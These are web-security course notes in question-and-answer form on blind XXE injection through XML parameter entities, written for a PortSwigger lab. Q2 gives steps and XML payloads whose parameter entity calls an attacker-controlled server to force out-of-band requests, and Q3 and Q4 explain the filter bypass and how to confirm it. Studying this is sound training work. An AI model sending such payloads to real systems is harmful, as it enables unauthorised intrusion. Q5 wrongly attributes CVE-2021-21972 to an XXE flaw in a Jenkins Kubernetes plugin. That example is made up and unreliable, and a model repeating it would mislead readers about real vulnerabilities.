---
course: Web Security
topic: XXE Injection
tags: [web-security]
---

## Practice Questions & Answers

**Q1. What is the purpose of using parameter entities in XML for exploiting XXE vulnerabilities?**

Parameter entities in XML are used to bypass certain security mechanisms that block regular external entities. Regular external entities can be blocked by the application due to security policies, but parameter entities can still be utilized within the Document Type Definition (DTD). By leveraging parameter entities, attackers can perform actions such as DNS lookups or HTTP requests to an attacker-controlled server, even when the application blocks standard external entities.

**Q2. How can you exploit a blind XXE vulnerability using parameter entities to interact with an attacker-controlled server?**

To exploit a blind XXE vulnerability using parameter entities, follow these steps:

1. Identify an endpoint that accepts and parses XML input.
2. Craft an XML payload that includes a parameter entity declaration. For example:
    ```xml
    <!DOCTYPE root [
        <!ENTITY % param SYSTEM "http://attacker-controlled-server/path">
        %param;
    ]>
    ```
3. Ensure the parameter entity points to a resource on an attacker-controlled server, such as a Burp Collaborator URL.
4. Send the crafted XML payload to the vulnerable endpoint.
5. Monitor the attacker-controlled server for DNS or HTTP requests initiated by the XML parser.

Here’s an example payload:
```xml
<!DOCTYPE root [
    <!ENTITY % param SYSTEM "http://burpcollaborator-client-url/path">
    %param;
]>
```

By sending this payload, the XML parser will attempt to fetch the content from the specified URL, triggering a DNS lookup and/or HTTP request to the attacker-controlled server.

**Q3. Explain why the application in the lab blocked regular external entities but allowed parameter entities.**

The application in the lab likely has a security policy that specifically blocks regular external entities to prevent unauthorized data exfiltration or other malicious activities. However, parameter entities are processed differently within the Document Type Definition (DTD) and may not be subject to the same restrictions. Parameter entities are only referenced within the DTD itself, which allows them to bypass the application's security checks designed to block regular external entities. As a result, parameter entities can still be exploited to achieve out-of-band interactions, such as DNS lookups or HTTP requests to an attacker-controlled server.

**Q4. How can you verify that your XXE exploit using parameter entities was successful?**

To verify the success of an XXE exploit using parameter entities, you should monitor the attacker-controlled server for evidence of interaction. Specifically, you should look for:

1. DNS requests: Check if the domain name associated with the attacker-controlled server received a DNS query.
2. HTTP requests: Verify if the server received an HTTP request from the vulnerable application.

For example, if you used Burp Collaborator, you can check the Burp Collaborator client interface to see if there were any interactions recorded. If you see DNS or HTTP requests originating from the vulnerable application, it indicates that the exploit was successful.

**Q5. What recent real-world examples demonstrate the exploitation of XXE vulnerabilities using parameter entities?**

One notable example is the exploitation of XXE vulnerabilities in various web applications and frameworks. For instance, CVE-2021-21972 describes an XXE vulnerability in the Jenkins plugin for Kubernetes. Attackers could exploit this vulnerability to read arbitrary files on the server by crafting malicious XML payloads that included parameter entities. Although this specific CVE did not explicitly mention parameter entities, the principle remains the same: attackers can use parameter entities to bypass security measures that block regular external entities.

Another example is the exploitation of XXE vulnerabilities in web services that parse XML input. Attackers might use parameter entities to perform out-of-band interactions, such as DNS or HTTP requests, to exfiltrate sensitive information or gain further access to the system.

In both cases, understanding and exploiting parameter entities can be crucial in bypassing security controls and achieving successful exploitation of XXE vulnerabilities.

---
<!-- nav -->
[[Web Security (PortSwigger)/08-XXE Injection/05-Lab 4 Blind XXE with out of band interaction via XML parameter entities/10-Understanding XXE Injection|Understanding XXE Injection]] | [[Web Security (PortSwigger)/08-XXE Injection/05-Lab 4 Blind XXE with out of band interaction via XML parameter entities/00-Overview|Overview]]
